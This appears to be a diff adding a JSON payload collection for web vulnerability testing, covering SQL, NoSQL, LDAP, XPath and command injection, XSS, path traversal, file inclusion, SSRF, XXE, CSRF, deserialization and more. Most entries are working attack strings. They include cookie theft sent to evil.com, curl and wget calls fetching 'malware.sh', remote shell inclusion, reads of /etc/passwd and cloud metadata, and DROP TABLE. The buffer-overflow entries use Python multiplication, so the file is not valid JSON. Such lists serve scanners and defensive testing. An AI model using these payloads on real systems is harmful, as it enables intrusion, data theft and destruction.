@@ -1,0 +1,166 @@
+{
+  "nosql_injection": {
+    "basic": [
+      {"$ne": null},
+      {"$gt": ""},
+      {"$where": "this.username == this.password"},
+      {"$regex": ".*"},
+      {"$exists": true},
+      {"$in": ["admin", "administrator"]},
+      {"$or": [{"username": "admin"}, {"username": "administrator"}]}
+    ],
+    "advanced": [
+      {"$where": "return true"},
+      {"$where": "function() { return true; }"},
+      {"$where": "1; return true"},
+      {"username": {"$regex": "^admin"}, "password": {"$exists": false}},
+      {"$where": "this.username.match(/admin/)"},
+      {"$where": "sleep(5000) || true"}
+    ],
+    "blind": [
+      {"$where": "this.username.length > 0"},
+      {"$where": "this.username.charAt(0) == 'a'"},
+      {"$where": "this.username.substring(0,1) == 'a'"}
+    ]
+  },
+  "xss": {
+    "basic": [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>",
+      "javascript:alert('XSS')",
+      "<iframe src=\"javascript:alert('XSS')\"></iframe>"
+    ],
+    "advanced": [
+      "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+      "<img src=\"x\" onerror=\"window.location='http://evil.com/steal?'+document.cookie\">",
+      "<svg/onload=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
+      "<details ontoggle=alert('XSS')>",
+      "<body onload=alert('XSS')>"
+    ],
+    "bypass": [
+      "<ScRiPt>alert('XSS')</ScRiPt>",
+      "<script>ale\\u0072t('XSS')</script>",
+      "<img src=\"javascript:alert('XSS')\">",
+      "<svg><script>alert('XSS')</script></svg>",
+      "';alert('XSS');//"
+    ],
+    "dom_based": [
+      "javascript:alert(document.domain)",
+      "#<script>alert('XSS')</script>",
+      "data:text/html,<script>alert('XSS')</script>",
+      "vbscript:msgbox(\"XSS\")"
+    ]
+  },
+  "sql_injection": {
+    "basic": [
+      "' OR '1'='1",
+      "' OR 1=1--",
+      "' UNION SELECT NULL--",
+      "'; DROP TABLE users;--",
+      "' OR 'a'='a"
+    ],
+    "blind": [
+      "' AND (SELECT COUNT(*) FROM users) > 0--",
+      "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)) > 100--",
+      "' AND SLEEP(5)--"
+    ],
+    "union": [
+      "' UNION SELECT username, password FROM users--",
+      "' UNION SELECT 1,2,3,4,5--",
+      "' UNION ALL SELECT NULL, version()--"
+    ]
+  },
+  "command_injection": {
+    "basic": [
+      "; ls -la",
+      "| cat /etc/passwd",
+      "&& whoami",
+      "|| id",
+      "`ls`"
+    ],
+    "blind": [
+      "; sleep 10",
+      "| ping -c 5 127.0.0.1",
+      "&& curl http://evil.com/callback",
+      "|| wget http://evil.com/malware.sh"
+    ]
+  },
+  "ldap_injection": [
+    "admin)(&(password=*))",
+    "admin)(|(password=*))",
+    "*)(uid=*",
+    "admin)(!(&(password=*)))"
+  ],
+  "xpath_injection": [
+    "' or '1'='1",
+    "' or position()=1 or 'a'='a",
+    "admin' or 'a'='a",
+    "') or ('a'='a"
+  ],
+  "header_injection": [
+    "\\r\\nX-Injected: true",
+    "\\n\\rSet-Cookie: evil=true",
+    "\\r\\nLocation: http://evil.com",
+    "%0d%0aX-Injected: true"
+  ],
+  "path_traversal": [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "....//....//....//etc//passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc%252fpasswd"
+  ],
+  "file_inclusion": {
+    "lfi": [
+      "/etc/passwd",
+      "php://input",
+      "php://filter/read=convert.base64-encode/resource=index.php",
+      "data://text/plain,<?php phpinfo(); ?>",
+      "expect://id"
+    ],
+    "rfi": [
+      "http://evil.com/shell.txt",
+      "ftp://evil.com/shell.txt",
+      "//evil.com/shell.txt"
+    ]
+  },
+  "ssrf": [
+    "http://localhost:8080",
+    "http://127.0.0.1:22",
+    "http://169.254.169.254/latest/meta-data/",
+    "file:///etc/passwd",
+    "gopher://127.0.0.1:6379/_INFO"
+  ],
+  "xxe": [
+    "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
+    "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/\">]><test>&xxe;</test>",
+    "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]><test>test</test>"
+  ],
+  "csrf": {
+    "forms": [
+      "<form action=\"http://target.com/api/users/delete\" method=\"POST\"><input type=\"hidden\" name=\"id\" value=\"1\"><input type=\"submit\" value=\"Click Me!\"></form>",
+      "<img src=\"http://target.com/api/logout\">"
+    ],
+    "ajax": [
+      "fetch('http://target.com/api/users/delete', {method: 'POST', body: JSON.stringify({id: 1}), headers: {'Content-Type': 'application/json'}})"
+    ]
+  },
+  "deserialization": [
+    "O:8:\"stdClass\":1:{s:4:\"evil\";s:6:\"system\";}",
+    "rO0ABXNyABdqYXZhLnV0aWwuSGFzaE1hcA==",
+    "aced0005737200116a6176612e7574696c2e486173684d6170"
+  ],
+  "regex_dos": [
+    "(a+)+b",
+    "(a|a)*",
+    "a{100000}",
+    "([a-zA-Z]+)*"
+  ],
+  "buffer_overflow": [
+    "A" * 1000,
+    "A" * 10000,
+    "%n" * 1000,
+    "\\x41" * 5000
+  ]
+}
